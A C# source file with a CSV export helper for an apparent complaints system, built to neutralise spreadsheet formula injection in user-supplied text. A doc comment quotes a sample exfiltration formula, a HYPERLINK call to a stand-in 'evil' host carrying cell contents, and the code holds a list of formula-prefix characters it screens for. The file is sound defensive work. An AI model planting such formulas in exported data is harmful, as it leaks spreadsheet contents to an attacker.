using System.Globalization;
using System.Text;

namespace Obhijog.Infrastructure.Export;

/// <summary>
/// CSV rendering, and the formula-injection defence of SPEC.md §14 F14.
///
/// Pure and static on purpose: the escaping rule is the security-relevant part of the
/// export and it is worth being able to assert on directly, one input string at a time,
/// without a database or an HTTP response in the way.
/// </summary>
public static class Csv
{
    /// <summary>
    /// The characters a spreadsheet treats as the start of a formula.
    ///
    /// Excel, LibreOffice and Google Sheets all evaluate a cell beginning with one of these
    /// when the file is opened. A complaint title is attacker-controlled free text — a
    /// citizen types it — so <c>=HYPERLINK("http://evil/"&amp;A1,"Click")</c> in a title would
    /// otherwise become a live link in whatever the department opens the export with. The
    /// export is the one place this application hands untrusted text to a program that runs
    /// it.
    ///
    /// <c>-</c> is on the list even though a negative number is a legitimate cell value,
    /// because a leading <c>-</c> is equally a formula prefix and this export has no numeric
    /// column a user can influence.
    /// </summary>
    private static readonly char[] FormulaPrefixes = ['=', '+', '-', '@'];

    /// <summary>
    /// One field, quoted and made safe. §14 F14.
    ///
    /// Two separate jobs, in this order:
    ///
    /// <list type="number">
    /// <item><b>Neutralise a formula.</b> A leading <c>=</c>, <c>+</c>, <c>-</c> or <c>@</c>
    /// is prefixed with an apostrophe, which every major spreadsheet reads as "this cell is
    /// text". The apostrophe goes on before quoting, so it lands inside the quotes and is
    /// part of the value rather than part of the CSV syntax.</item>
    /// <item><b>Quote.</b> Every field is quoted, not only the ones containing a comma — a
    /// conditional rule is one that eventually gets the condition wrong. An embedded quote
    /// is doubled, per RFC 4180.</item>
    /// </list>
    ///
    /// Control characters are stripped rather than escaped. A newline inside a quoted field
    /// is legal CSV and a carriage return is legal too, but between them they are the
    /// difference between a file that parses everywhere and one that parses in the tool you
    /// happened to test — and a complaint description is multi-line free text, so this is
    /// the common case rather than the exotic one.
    /// </summary>
    public static string Field(string? value)
    {
        if (string.IsNullOrEmpty(value))
        {
            return "\"\"";
        }

        var flattened = Flatten(value);

        // Checked after flattening: " =cmd" with a leading tab or newline would otherwise
        // slip past a test on the raw first character while still reaching the spreadsheet
        // as a formula.
        var trimmed = flattened.TrimStart();

        if (trimmed.Length > 0 && FormulaPrefixes.Contains(trimmed[0]))
        {
            flattened = "'" + trimmed;
        }

        return "\"" + flattened.Replace("\"", "\"\"") + "\"";
    }

    /// <summary>A whole row, comma-separated, with no trailing separator.</summary>
    public static string Row(params string?[] fields) =>
        string.Join(",", fields.Select(Field));

    /// <summary>
    /// An instant, or an empty field when absent. Round-trip UTC ("u" is
    /// <c>yyyy-MM-dd HH:mm:ssZ</c>), because an export is read by machines at least as often
    /// as by people and a locale-dependent date is the classic way to lose a day.
    /// </summary>
    public static string? Instant(DateTimeOffset? value) =>
        value?.UtcDateTime.ToString("u", CultureInfo.InvariantCulture);

    public static string Number(int value) => value.ToString(CultureInfo.InvariantCulture);

    /// <summary>
    /// Collapses the characters that break naive CSV parsers into single spaces, then
    /// squeezes the runs. A description written as three paragraphs becomes one readable
    /// line rather than three rows pretending to be complaints.
    /// </summary>
    private static string Flatten(string value)
    {
        var builder = new StringBuilder(value.Length);
        var lastWasSpace = false;

        foreach (var character in value)
        {
            var isBreak = character is '\r' or '\n' or '\t' || char.IsControl(character);
            var next = isBreak ? ' ' : character;

            if (next == ' ' && lastWasSpace)
            {
                continue;
            }

            builder.Append(next);
            lastWasSpace = next == ' ';
        }

        return builder.ToString().TrimEnd();
    }
}
